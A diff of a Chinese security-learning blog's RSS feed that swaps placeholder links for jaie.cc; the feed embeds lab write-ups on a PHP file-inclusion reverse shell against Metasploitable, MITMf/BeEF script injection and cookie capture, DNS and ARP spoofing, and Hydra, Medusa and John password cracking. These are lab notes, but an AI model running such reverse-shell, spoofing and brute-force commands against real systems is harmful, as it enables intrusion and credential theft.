@@ -4,7 +4,7 @@
   xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Jaie</title>
-    <link>http://yoursite.com/</link>
+    <link>https://jaie.cc/</link>
     <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description></description>
@@ -13,8 +13,8 @@
     
     <item>
       <title>文件遍历漏洞</title>
-      <link>http://yoursite.com/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
-      <guid>http://yoursite.com/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
+      <link>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</link>
+      <guid>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</guid>
       <pubDate>Thu, 25 Apr 2019 07:54:06 GMT</pubDate>
       <description>
       
@@ -30,13 +30,13 @@
       
       <content:encoded><![CDATA[<ol><li>环境搭建<br>测试机ip：192.168.86.135<br><br>靶机metasploittable的ip:192.168.86.128<br>靶机编辑php.ini文件</li></ol><pre><code>sudo vim /etc/php5/cgi/php.ini  //编辑php配置文件</code></pre><p>找到allow_url_include这一行把Off改成On，  </p><pre><code>sudo /etc/init.d/apache2 restart //重启apache服务 </code></pre><ol start="2"><li>发起攻击  </li></ol><ul><li>尝试文件<code>/etc/passwd</code>遍历查看，成功。<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.07-59.png" alt></li><li>尝试定位url链接，成功<br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%B8%80%E4%B8%AAurl%202018.11.21%2022.13-23.png" alt></li><li>测试机开启apache服务，制作php反弹shell，使其定位其链接<a href="http://192.168.86.135/1.php" target="_blank" rel="noopener">http://192.168.86.135/1.php</a><br><code>`</code><br>cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php  //复制成1.php到web目录下<br>vim 1.php //修改127.0.0.1成测试机ip完成保存<br>service apache2 start  //开启apache服务<br><br>nc -nvvlp 1234  //nc开启监控端口</li></ul><p><code>`</code><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/php%E5%8F%8D%E5%BC%B9shell.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.27-9.png" alt><br><img src="https://raw.githubusercontent.com/Jaie0801/temp/master/img/2018.11.21%2022.28-18.png" alt></p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/04/25/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
     </item>
     
     <item>
       <title>mitmf使用实行中间人xss攻击</title>
-      <link>http://yoursite.com/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</link>
-      <guid>http://yoursite.com/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</guid>
+      <link>https://jaie.cc/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</link>
+      <guid>https://jaie.cc/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/</guid>
       <pubDate>Thu, 25 Apr 2019 07:38:50 GMT</pubDate>
       <description>
       
@@ -49,13 +49,13 @@
       
       <content:encoded><![CDATA[<h5 id="下载mitmf"><a href="#下载mitmf" class="headerlink" title="下载mitmf"></a>下载mitmf</h5><p><code>apt-get install mitmf</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190424103338.png" alt><br>kali2.0以上默认没有mitmf软件，kali1.0有mitmif。blackarch集成mitmf，推荐使用。</p><h5 id="mitmf实行xss攻击"><a href="#mitmf实行xss攻击" class="headerlink" title="mitmf实行xss攻击"></a>mitmf实行xss攻击</h5><h6 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h6><p><code>cd /usr/share.beef/</code>目录下，<code>./beef</code>启动beef<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141449.png" alt><br>默认账号密码都为beef<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190424105202.png" alt><br>使用arp欺骗，插入js脚本，实现xss攻击<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141126.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141601.png" alt><br>可以看到网页源码已经插入js脚本了<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425141737.png" alt>   </p><h5 id="mitmf键盘记录器"><a href="#mitmf键盘记录器" class="headerlink" title="mitmf键盘记录器"></a>mitmf键盘记录器</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425150858.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425150940.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151056.png" alt><br>mitmf网页图片倒置（恶作剧）<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151443.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425151819.png" alt></p><h4 id="mitmf-cookie显示"><a href="#mitmf-cookie显示" class="headerlink" title="mitmf cookie显示"></a>mitmf cookie显示</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425152443.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190425152517.png" alt></p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/04/25/mitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB/#disqus_thread</comments>
     </item>
     
     <item>
       <title>dnschefDNS欺骗</title>
-      <link>http://yoursite.com/2019/04/24/DNS%E6%AC%BA%E9%AA%97/</link>
-      <guid>http://yoursite.com/2019/04/24/DNS%E6%AC%BA%E9%AA%97/</guid>
+      <link>https://jaie.cc/2019/04/24/DNS%E6%AC%BA%E9%AA%97/</link>
+      <guid>https://jaie.cc/2019/04/24/DNS%E6%AC%BA%E9%AA%97/</guid>
       <pubDate>Wed, 24 Apr 2019 07:40:07 GMT</pubDate>
       <description>
       
@@ -68,13 +68,13 @@
       
       <content:encoded><![CDATA[<p>dnschef –fakeip=192.168.200.2 –fakedomains=<a href="http://www.baidu.com,www.qq.com" target="_blank" rel="noopener">www.baidu.com,www.qq.com</a> –interface 192.168.200.243 -q<br>fackip欺骗到指定的ip，facedomains欺骗域名<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419162125.png" alt><br>window修改dns服务器<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419162027.png" alt></p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/04/24/DNS%E6%AC%BA%E9%AA%97/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/04/24/DNS%E6%AC%BA%E9%AA%97/#disqus_thread</comments>
     </item>
     
     <item>
       <title>使用john破解密码</title>
-      <link>http://yoursite.com/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
-      <guid>http://yoursite.com/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
+      <link>https://jaie.cc/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
+      <guid>https://jaie.cc/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
       <pubDate>Wed, 24 Apr 2019 07:38:36 GMT</pubDate>
       <description>
       
@@ -90,13 +90,13 @@ Copyri
       
       <content:encoded><![CDATA[<pre><code> johnCreated directory: /root/.johnJohn the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx]Copyright (c) 1996-2015 by Solar Designer and othersHomepage: http://www.openwall.com/john/Usage: john [OPTIONS] [PASSWORD-FILES]--single[=SECTION]        &quot;single crack&quot; mode   --wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin                  --pipe  like --stdin, but bulk reads, and allows rules--loopback[=FILE]         like --wordlist, but fetch words from a .pot file--dupe-suppression        suppress all dupes in wordlist (and force preload)--prince[=FILE]           PRINCE mode, read words from FILE--encoding=NAME           input encoding (eg. UTF-8, ISO-8859-1). See also                          doc/ENCODING and --list=hidden-options.--rules[=SECTION]         enable word mangling rules for wordlist modes--incremental[=MODE]      &quot;incremental&quot; mode [using section MODE]--mask=MASK               mask mode using MASK--markov[=OPTIONS]        &quot;Markov&quot; mode (see doc/MARKOV)--external=MODE           external mode or word filter--stdout[=LENGTH]         just output candidate passwords [cut at LENGTH]--restore[=NAME]          restore an interrupted session [called NAME]--session=NAME            give a new session the NAME--status[=NAME]           print status of a session [called NAME]--make-charset=FILE       make a charset file. It will be overwritten--show[=LEFT]             show cracked passwords [if =LEFT, then uncracked]--test[=TIME]             run tests and benchmarks for TIME seconds each--users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only--groups=[-]GID[,..]      load users [not] of this (these) group(s) only--shells=[-]SHELL[,..]    load users with[out] this (these) shell(s) only--salts=[-]COUNT[:MAX]    load salts with[out] COUNT [to MAX] hashes--save-memory=LEVEL       enable memory saving, at LEVEL 1..3--node=MIN[-MAX]/TOTAL    this node&#39;s number range out of TOTAL count--fork=N                  fork N processes--pot=NAME                pot file to use--list=WHAT               list capabilities, see --list=help or doc/OPTIONS--format=NAME             force hash of type NAME. The supported formats can                          be seen with --list=formats and --list=subformats</code></pre><h4 id="破解linux密码"><a href="#破解linux密码" class="headerlink" title="破解linux密码"></a>破解linux密码</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416202809.png" alt><br>显示已完成破解的密码文件<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416203204.png" alt><br>john破解缓存文件夹<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416203451.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416203556.png" alt>   </p><h4 id="john破解windows密码"><a href="#john破解windows密码" class="headerlink" title="john破解windows密码"></a>john破解windows密码</h4><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416204211.png" alt><br>显示破解的密码<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416204506.png" alt></p><h4 id="john的图形化界面——johnny"><a href="#john的图形化界面——johnny" class="headerlink" title="john的图形化界面——johnny"></a>john的图形化界面——johnny</h4><p>johnny破解linux密码<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190416205352.png" alt>   </p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/04/24/john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
     </item>
     
     <item>
       <title>arp攻击</title>
-      <link>http://yoursite.com/2019/04/24/arp%E6%94%BB%E5%87%BB/</link>
-      <guid>http://yoursite.com/2019/04/24/arp%E6%94%BB%E5%87%BB/</guid>
+      <link>https://jaie.cc/2019/04/24/arp%E6%94%BB%E5%87%BB/</link>
+      <guid>https://jaie.cc/2019/04/24/arp%E6%94%BB%E5%87%BB/</guid>
       <pubDate>Wed, 24 Apr 2019 07:35:42 GMT</pubDate>
       <description>
       
@@ -112,13 +112,13 @@ Usag
       
       <content:encoded><![CDATA[<p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418162924.png" alt></p><pre><code>arpspoof -hVersion: 2.4Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code></pre><p>aspspoof -t 被攻击ip -r 网关ip<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418163045.png" alt><br>然后可以看到winows主机的arp表的变化<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418163203.png" alt><br>这时所有的windows通过网关都会转到kali上，所以被攻击无网络服务了。<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418163339.png" alt><br>kali开启路由转发，<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>此时windows就可以上网了，但是所有的流量都经过kali进行转发。<br>利用kali网卡wireshark进行抓包<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418164821.png" alt><br>driftnet抓取目标机数据图片<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190418165355.png" alt><br>创建arotemp目录存放数据图片音频信息，<code>driftnet -i eth0 -a -d arptemp -s</code>-i 选择接口 -a 数据存放目录 -d 指定目录<br>-s 抓取音频仅支持MOEG<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419134908.png" alt><br>获取目标浏览url信息<code>urlsnarf -i eth0</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419135649.png" alt><br>dsniff 对目标密码进行捕获，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190419141843.png" alt></p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/04/24/arp%E6%94%BB%E5%87%BB/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/04/24/arp%E6%94%BB%E5%87%BB/#disqus_thread</comments>
     </item>
     
     <item>
       <title>markdown语法</title>
-      <link>http://yoursite.com/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/</link>
-      <guid>http://yoursite.com/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/</guid>
+      <link>https://jaie.cc/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/</link>
+      <guid>https://jaie.cc/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/</guid>
       <pubDate>Fri, 29 Mar 2019 08:32:08 GMT</pubDate>
       <description>
       
@@ -133,13 +133,13 @@ Usag
       
       <content:encoded><![CDATA[<h2 id="1-斜体和粗体"><a href="#1-斜体和粗体" class="headerlink" title="1. 斜体和粗体"></a>1. 斜体和粗体</h2><pre><code>*斜体* //斜体**粗体** //粗体</code></pre><h2 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2. 分级标题"></a>2. 分级标题</h2><p>用#——#####以”#”的个数进行逐级分级，1-5级;<br>用h1——h5逐级分级</p><h2 id="3-外链接"><a href="#3-外链接" class="headerlink" title="3. 外链接"></a>3. 外链接</h2><pre><code>使用 [描述](链接地址) 为文字增加外链接</code></pre><h2 id="5-段落和换行"><a href="#5-段落和换行" class="headerlink" title="5.段落和换行"></a>5.段落和换行</h2><ul><li>第一种写法：直接敲两个回车键即可<br></li><li>第二种写法:在写完一段后敲两个空格，然后回车写下一段  </li><li>第三种写法:<br><code>&lt;br /&gt;</code>作为换行，然后写下一段<h2 id="6-分隔线-amp-引言"><a href="#6-分隔线-amp-引言" class="headerlink" title="6.分隔线&amp;引言"></a>6.分隔线&amp;引言</h2><code>`</code></li></ul><hr><hr><p>===</p><hr><p><code>`引言</code>&gt;<code>加___  还有一种写法就是每一行都用一个 “&gt;” 号&lt;br&gt;</code>&gt; &gt; <code></code>另外一种就是嵌套引用</p><h2 id="7-列表"><a href="#7-列表" class="headerlink" title="7.列表"></a>7.列表</h2><ul><li>无序列表<br>无序列表可以在每行开头用星号、加号、减号来表示，也可以三者混合一起，推荐使用相同的字符，避免混乱<br></li><li>有序列表<br><br>有序列表用数字接着一个英文句点来表示，数字可无序，但还是推荐使用1.、2.，避免混乱。</li></ul><h2 id="8-代码"><a href="#8-代码" class="headerlink" title="8.代码"></a>8.代码</h2><p>代码块用两个<code>这种符号围住  用`</code>（语言）把代码起始行末尾行围住<br><br>用tap键</p><h2 id="9-更多阅读"><a href="#9-更多阅读" class="headerlink" title="9.更多阅读"></a>9.更多阅读</h2><p><code>&lt;!--more--&gt;</code></p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/03/29/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C/#disqus_thread</comments>
     </item>
     
     <item>
       <title>hash_identifier和Hashid猜测识别加密算法</title>
-      <link>http://yoursite.com/2019/03/29/hash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</link>
-      <guid>http://yoursite.com/2019/03/29/hash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</guid>
+      <link>https://jaie.cc/2019/03/29/hash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</link>
+      <guid>https://jaie.cc/2019/03/29/hash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</guid>
       <pubDate>Fri, 29 Mar 2019 08:30:05 GMT</pubDate>
       <description>
       
@@ -152,13 +152,13 @@ Usag
       
       <content:encoded><![CDATA[<p>1.hash-identifier<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329110918.png" alt><br>2.hashid<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329154116.png" alt></p>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/03/29/hash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/03/29/hash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/#disqus_thread</comments>
     </item>
     
     <item>
       <title>使用medusa破解密码</title>
-      <link>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
-      <guid>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
+      <link>https://jaie.cc/2019/03/29/%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
+      <guid>https://jaie.cc/2019/03/29/%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
       <pubDate>Fri, 29 Mar 2019 08:28:26 GMT</pubDate>
       <description>
       
@@ -172,13 +172,13 @@ Usag
       
       <content:encoded><![CDATA[<ul><li><code>medusa -h</code>查看帮助   <img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329154601.png" alt><br>主要参数：   <blockquote><p>-h 目标域名或ip<br>-H 包含ip后域名的文件<br>-u 用户名测试<br><br>-U 包含要测试的用户名的文件<br><br>-p 密码测试<br>-P 包含要测试的密码的文件<br>-e[n/s/ns]  添加其他密码检查条件 (无密码,密码 = 用户名)<br>-M 要执行的模块的名称 (不包括. mod 扩展)<br>-d 输出所有模块<br><br>-n 用于非默认 TCP 端口号<br>-s 启用ssl   </p></blockquote></li><li><code>medusa -d</code> 输出所有模块<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329160122.png" alt></li><li>medusa破解ftp <br><br>靶机开启ftp服务，攻击机进行破解<br><code>medusa -u root -P comon.lst -h 192.168.200.243 -M ftp</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329160635.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329160534.png" alt></li><li>medusa破解mysql<br><code>medusa -u root -P comon.lst -h 192.168.200.244 -e ns -M mysql</code> mysql无密码   <img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329161616.png" alt>   </li><li>medusa破解ssh<br><code>medusa -u root -P comon.lst -h 192.168.200.244 -e ns -M ssh</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329162419.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329162449.png" alt></li></ul>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/03/29/%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
     </item>
     
     <item>
       <title>pw-inspector筛选字典内容</title>
-      <link>http://yoursite.com/2019/03/29/pw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9/</link>
-      <guid>http://yoursite.com/2019/03/29/pw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9/</guid>
+      <link>https://jaie.cc/2019/03/29/pw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9/</link>
+      <guid>https://jaie.cc/2019/03/29/pw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9/</guid>
       <pubDate>Fri, 29 Mar 2019 03:27:52 GMT</pubDate>
       <description>
       
@@ -192,13 +192,13 @@ Usag
       
       <content:encoded><![CDATA[<ul><li><p><code>pw-inspector -h</code>查看帮助<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329110918.png" alt>   </p><blockquote><p>-i 输入文件<br><br>-o 输出文件<br>-m 有效密码的最小长度<br>-M 有效密码的最大长度<br>-l 小写字母<br>-u 大学字母<br><br>-p  可打印的字符 <br><br>-s 特殊字符<br><br>-n  数字</p></blockquote></li><li><p><code>pw-inspector -i pass.lst -o up.lst -l</code>筛选pass.lst字典小写字符输出为lp.lst(包含一个小写字母也算)</p></li><li><code>pw-inspector -i pass.lst -o up.lst -l u</code>筛选pass.lst字典小写字符输出为up.lst(包含一个大写字母也算)</li></ul>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/03/29/pw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/03/29/pw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9/#disqus_thread</comments>
     </item>
     
     <item>
       <title>使用hydra破解密码</title>
-      <link>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
-      <guid>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
+      <link>https://jaie.cc/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</link>
+      <guid>https://jaie.cc/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</guid>
       <pubDate>Fri, 29 Mar 2019 02:49:16 GMT</pubDate>
       <description>
       
@@ -213,7 +213,7 @@ Usag
       
       <content:encoded><![CDATA[<p>1.windows密码破解</p><ul><li>smb密码破解<br>设置windows账号密码，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325112320.png" alt><br><br>linux的ssh登陆密码破解<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325133211.png" alt><br>hydra破解ftp登陆账号密码<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325145427.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325145338.png" alt><br>hydra破解表单密码，这里是我是dvwa页面破解。密码破解的特征是密码正确会跳转到index.php页面。使用post方式提交密码。<br><code>hydra -l admin -P comon.lst 192.168.200.244 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -V</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329103051.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329103712.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190329103853.png" alt><br>xhydra是hydra的图形界面<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190325143122.png" alt>   </li></ul>]]></content:encoded>
       
-      <comments>http://yoursite.com/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
+      <comments>https://jaie.cc/2019/03/29/%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/#disqus_thread</comments>
     </item>
     
   </channel>
